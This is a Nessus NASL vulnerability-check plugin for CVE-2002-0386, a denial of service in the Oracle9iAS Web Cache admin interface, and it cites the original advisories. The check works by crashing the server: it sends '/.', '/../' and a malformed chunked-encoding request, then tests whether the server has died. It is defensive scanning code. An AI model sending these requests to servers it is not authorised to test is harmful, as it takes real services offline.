#
# This script was written by Michel Arboi <arboi@alussinan.org>
# GPL
# *untested*
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID
#
# References:
# Date:  Thu, 18 Oct 2001 16:16:20 +0200
# From: "andreas junestam" <andreas.junestam@defcom.com>
# Affiliation: Defcom
# To: "bugtraq" <bugtraq@securityfocus.com>
# Subject: def-2001-30
#
# From: "@stake advisories" <advisories@atstake.com>
# To: vulnwatch@vulnwatch.org
# Date: Mon, 28 Oct 2002 13:30:54 -0500
# Subject: Oracle9iAS Web Cache Denial of Service (a102802-1)
#
# http://www.atstake.com/research/advisories/2002/a102802-1.txt
# http://otn.oracle.com/deploy/security/pdf/2002alert43rev1.pdf
#
# Affected:
# Oracle9iAS Web Cache/2.0.0.1.0
# 


if(description)
{
 script_id(11076);
 script_bugtraq_id(3765, 5902);
 script_version ("$Revision: 1.13 $");
 script_cve_id("CVE-2002-0386");
 name["english"] = "Oracle webcache admin interface DoS";
 script_name(english:name["english"]);
 
 desc["english"] = "It was possible to kill the web server by
requesting '/.' or '/../', or sending an invalid request
using chunked content encoding

A cracker may exploit this vulnerability to make your web server
crash continually.

Solution : upgrade your software or protect it with a filtering reverse proxy
Risk factor : Low";

 script_description(english:desc["english"]);
 
 summary["english"] = "Invalid web requests crash Oracle webcache admin";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi");
 family["english"] = "Databases";
 script_family(english:family["english"]);
 script_require_ports("Services/www", 4000);
 script_dependencie("find_service.nes", "httpver.nasl", "http_version.nasl");
 exit(0);
}

########

include("http_func.inc");
include("misc_func.inc");

function check(port)
{
  local_var	soc, r;

 if (http_is_dead(port: port)) return;

 soc = http_open_socket(port);
  if(! soc) return;

 # The advisory says "GET /. HTTP/1.0" - however this won't get
 # past some transparent proxies, so it's better to use http_get()
 
 r = http_get(port: port, item: "/.");
  send(socket:soc, data: r);
  r = http_recv(socket:soc);
  http_close_socket(soc);

  soc = http_open_socket(port);
  if(soc)
  {
    r = http_get(port: port, item: "/../");
 send(socket:soc, data: r);
 r = http_recv(socket:soc);
 http_close_socket(soc);

    soc = http_open_socket(port);
    if(soc)
    {
      r = http_get(port: port, item: "/");
      r = r - '\r\n';
      r = strcat(r, 'Transfer-Encoding: chunked\r\n\r\n');
      send(socket:soc, data: r);
      r = http_recv(socket:soc);
      http_close_socket(soc);
    }
  }
 sleep(1); # Is it really necessary ?
 if(http_is_dead(port:port))security_hole(port);
 return;
}

ports = add_port_in_list(list:get_kb_list("Services/www"), port:4000);
foreach port (ports) check(port: port);

